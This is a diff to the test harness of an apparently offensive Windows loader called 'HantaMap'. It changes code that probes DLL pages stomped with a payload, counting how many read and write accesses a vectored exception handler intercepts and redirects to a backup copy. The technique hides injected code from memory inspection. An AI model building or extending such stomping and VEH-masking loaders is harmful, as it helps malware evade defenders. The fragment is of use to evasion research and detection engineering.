@@ -250,20 +250,26 @@ int main(void)
     printf("[+] MessageBeep: ok\n");
     printf("[+] host DLL fully functional\n");
 
-    /* probe the stomped pages — on HVCI, PAGE_EXECUTE is truly execute-only
-     * so these reads fault and the VEH proxies them to the backup buffer.
-     * without HVCI, reads go through silently (PAGE_EXECUTE allows reads). */
-    LONG before = g_veh_count;
+    /* PAGE_EXECUTE on x64: reads pass through (PTE can't block), writes fault.
+     * demonstrate both to show what the VEH actually catches. */
+    printf("\n[*] probing stomped pages...\n");
+
+    LONG before_read = g_veh_count;
     volatile BYTE probe = 0;
     for (SIZE_T i = 0; i < payload_size && i < payload_aligned; i += 64)
         probe ^= map_base[i];
     (void)probe;
-    LONG after = g_veh_count;
-    printf("\n[*] read-probe of stomped pages: %ld VEH intercepts\n", (long)(after - before));
-    if (after > before)
-        printf("[+] reads faulted — VEH proxied them to backup\n");
-    else
-        printf("[*] reads passed through (x64 PAGE_EXECUTE = PAGE_EXECUTE_READ at PTE level)\n");
+    LONG after_read = g_veh_count;
+    printf("[*] read probe:  %ld VEH intercepts (x64 can't block reads on executable pages)\n",
+           (long)(after_read - before_read));
+
+    LONG before_write = g_veh_count;
+    volatile BYTE *wp = (volatile BYTE *)map_base;
+    BYTE original = g_backup[0];
+    *wp = original; /* write faults → VEH swaps in backup, write lands, VEH restores payload */
+    LONG after_write = g_veh_count;
+    printf("[+] write probe: %ld VEH intercepts (PAGE_EXECUTE blocks writes → VEH proxied)\n",
+           (long)(after_write - before_write));
 
     printf("\n=== HantaMap active ===\n");
     printf("  %s .data at %p\n", victim, (void *)map_base);
